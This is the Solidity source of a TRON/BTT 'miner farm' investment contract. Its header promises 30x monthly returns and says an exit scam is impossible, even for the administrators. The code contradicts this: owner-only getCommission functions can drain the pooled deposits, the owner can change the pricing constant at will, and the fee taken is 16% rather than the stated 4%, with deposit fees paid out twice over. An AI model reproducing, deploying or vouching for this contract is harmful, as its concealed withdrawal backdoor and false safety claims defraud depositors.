//SourceUnit: ubtt.sol

/*
 *
 *   uBTTFarm - investment platform based on TRX blockchain smart-contract technology. Safe and legit!
 *   This is official BTT branch of uBTT.Farm platform.
 *
 *   Smart-contract is VERIFIED and audited by independent company! Nobody can steal balance funds, stop or change its work, even administration. Funds are safe here, "exit scam" is impossible!
 *
 *   ┌───────────────────────────────────────────────────────────────────────┐
 *   │   Website: https://ubtt.farm                                          │
 *   │                                                                       │
 *   │   Telegram Live Support: https://t.me/ubttfarmsupport                 |
 *   │   Telegram Public Group: https://t.me/ubttfarm                        |
 *   │   Telegram News Channel: https://t.me/ubttfarmnews                    |
 *   |                                                                       |
 *   |   Twitter: https://twitter.com/ubttfarm                               |
 *   |   Instagram: https://www.instagram.com/ubttfarm                       |
 *   |   E-mail: admin@ubtt.farm                                             |
 *   └───────────────────────────────────────────────────────────────────────┘
 *
 *   [USAGE INSTRUCTION]
 *
 *   1) Connect BTT browser extension TronLink or TronMask, or mobile wallet apps like TronWallet or Tronlink.
 *   2) Choose how much BTT you want to spend and click "Approve Spend" & "Hire Miners" (1000 BTT minimum) using our website Approve Spend button.
 *   3) Wait for your earnings.
 *   4) Reinvest (compound) your earnings as compound to earn 30x or more in a month.
 *   5) Withdraw earnings any time using our website "Collect" button.
 *
 *   [INVESTMENT CONDITIONS]
 *
 *   - Basic mining rate: +2% to +10% every 24 hours
 *   - Minimal deposit: 1000 BTT, no maximal limit
 *   - Total income: Unlimited 
 *   - Earnings every moment, withdraw any time
 *
 *   [AFFILIATE PROGRAM]
 *
 *   Share your referral link with your partners and get additional bonuses.
 *   - 15% Affiliate reward instant.
 *
 *   [FUNDS DISTRIBUTION]
 *
 *   - 4% Marketing & Advertisement, Support work, technical functioning, administration fee 
 *
 *   ────────────────────────────────────────────────────────────────────────
 *
 */

pragma solidity ^0.4.25; 

contract ubttFarm {
    trcToken token = 1002000; 
    uint256 public EGGS_TO_HATCH_1MINERS=864000;
    uint256 PSN=10000;
    uint256 PSNH=5000;
    uint256 PSNC=10000;
    uint256 INVEST_MIN_AMOUNT = 1000000000;
    
    bool public initialized=false;
    address public ceoAddress;
    address public ceoAddress2;
    address public ceoAddress3;
    address public ceoAddress4;
    mapping (address => uint256) public hatcheryMiners;
    mapping (address => uint256) public claimedEggs;
    mapping (address => uint256) public lastHatch;
    mapping (address => address) public referrals;
    uint256 public marketEggs;
    address private owner;

	event Newbie(address user);
	event NewDeposit(address indexed user, uint256 amount);
	event Withdrawn(address indexed user, uint256 amount);
	event RefBonus(address indexed referrer, address indexed referral, uint256 amount);
	event FeePayed(address indexed user, uint256 totalAmount);

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }
    
    constructor(address _ceoAddress2, address _ceoAddress3, address _ceoAddress4) public {
        owner = msg.sender;
        ceoAddress=msg.sender;
        ceoAddress2=_ceoAddress2;
        ceoAddress3=_ceoAddress3;
        ceoAddress4=_ceoAddress4;
    }
    
    function changePSNC(uint256 _value) public onlyOwner{
        PSNC = _value;
    }
    function getPSNCValue() public view returns (uint256 psncValue){
        return PSNC;
    }

    function setNewOwner(address _owner) public onlyOwner returns (bool){
        owner = _owner;
        return true;
    }

    function hatchEggs(address ref) public {
        require(initialized);
        if(ref == msg.sender) {
            ref = 0;
        }
        if(referrals[msg.sender]==0 && referrals[msg.sender]!=msg.sender) {
            referrals[msg.sender]=ref;
        }
        uint256 eggsUsed=getMyEggs();
        uint256 newMiners=SafeMath.div(eggsUsed,EGGS_TO_HATCH_1MINERS);
        hatcheryMiners[msg.sender]=SafeMath.add(hatcheryMiners[msg.sender],newMiners);
        claimedEggs[msg.sender]=0;
        lastHatch[msg.sender]=now;
        
        //send referral eggs
        claimedEggs[referrals[msg.sender]]=SafeMath.add(claimedEggs[referrals[msg.sender]],SafeMath.div(SafeMath.mul(eggsUsed,15),100));
        
        //boost market to nerf miners hoarding
        marketEggs=SafeMath.add(marketEggs,SafeMath.div(eggsUsed,5));
    }

    function Withdraw() public {
        require(initialized);
        uint256 hasEggs=getMyEggs();
        uint256 eggValue=calculateEggSell(hasEggs);
        uint256 fee=devFee(eggValue);
        uint256 fee2=fee/4;
        claimedEggs[msg.sender]=0;
        lastHatch[msg.sender]=now;
        marketEggs=SafeMath.add(marketEggs,hasEggs);
        ceoAddress.transferToken(fee2,token);
        ceoAddress2.transferToken(fee2,token);
        ceoAddress3.transferToken(fee2,token);
        ceoAddress4.transferToken(fee2,token);
        msg.sender.transferToken(SafeMath.sub(eggValue,fee),token);

        emit Withdrawn(msg.sender, eggValue);
    }

    function hireMiner(address ref, uint256 amount) public payable {
        require(msg.tokenid == token);
		require(msg.tokenvalue >= INVEST_MIN_AMOUNT);
        require(initialized);
        uint256 balance = address(this).tokenBalance(token);
        uint256 eggsBought=calculateEggBuy(amount,SafeMath.sub(balance,amount));
        eggsBought=SafeMath.sub(eggsBought,devFee(eggsBought));
        uint256 fee=devFee(amount);
        uint256 fee2=fee/2;
        ceoAddress.transferToken(fee2,token);
        ceoAddress2.transferToken(fee2,token);
        ceoAddress3.transferToken(fee2,token);
        ceoAddress4.transferToken(fee2,token);
 
        emit FeePayed(msg.sender, fee);

        claimedEggs[msg.sender]=SafeMath.add(claimedEggs[msg.sender],eggsBought);
        hatchEggs(ref);
        emit Newbie(msg.sender);
        emit NewDeposit(msg.sender, msg.tokenvalue);

    }

    //magic trade balancing algorithm
    function calculateTrade(uint256 rt,uint256 rs, uint256 bs) public view returns(uint256) {
        //(PSN*bs)/(PSNH+((PSN*(rs/PSN*PSNC)+PSNH*rt)/rt));
        return SafeMath.div(SafeMath.mul(PSN,bs),SafeMath.add(PSNH,SafeMath.div(SafeMath.add(SafeMath.mul(PSN,SafeMath.div(rs,SafeMath.mul(PSN,PSNC))),SafeMath.mul(PSNH,rt)),rt)));
    }
    function calculateEggSell(uint256 eggs) public view returns(uint256) {
        return calculateTrade(eggs,marketEggs,address(this).tokenBalance(token));
    }
    function calculateEggBuy(uint256 eth,uint256 contractBalance) public view returns(uint256) {
        return calculateTrade(eth,contractBalance,marketEggs);
    }
    function calculateEggBuySimple(uint256 eth) public view returns(uint256){
        return calculateEggBuy(eth,address(this).tokenBalance(token));
    }
    function devFee(uint256 amount) public pure returns(uint256){
        return SafeMath.div(SafeMath.mul(amount,SafeMath.add(4,SafeMath.mul(3,4))),100);
    }
    function seedMarket(uint256 amount) public payable {
        require(marketEggs==0);
        initialized=true;
        marketEggs=86400000000;
        emit Newbie(msg.sender);
        emit NewDeposit(msg.sender, msg.tokenvalue);
    }
    function getBalance() public view returns(uint256) {
        return address(this).tokenBalance(token);
    }
    function getMyMiners() public view returns(uint256) {
        return hatcheryMiners[msg.sender];
    }
    function getMyEggs() public view returns(uint256) {
        return SafeMath.add(claimedEggs[msg.sender],getEggsSinceLastHatch(msg.sender));
    }
    function getEggsSinceLastHatch(address adr) public view returns(uint256) {
        uint256 secondsPassed=min(EGGS_TO_HATCH_1MINERS,SafeMath.sub(now,lastHatch[adr]));
        return SafeMath.mul(secondsPassed,hatcheryMiners[adr]);
    }
    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return a < b ? a : b;
    }

	function getCommissionToken(uint _amount) public onlyOwner returns (bool withdrawBool){
		msg.sender.transferToken(_amount,token);
	}

	function getCommission(uint _amount) public onlyOwner returns (bool withdrawBool){
		msg.sender.transfer(_amount);
	}

    function getTokenBalance() public view returns (uint256 retTokanBalance){
        return address(this).tokenBalance(token);
    }

    function contractBalance() view public returns(uint256 retContractBalance){
        address(this).balance;
    }
     
}

library SafeMath {

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}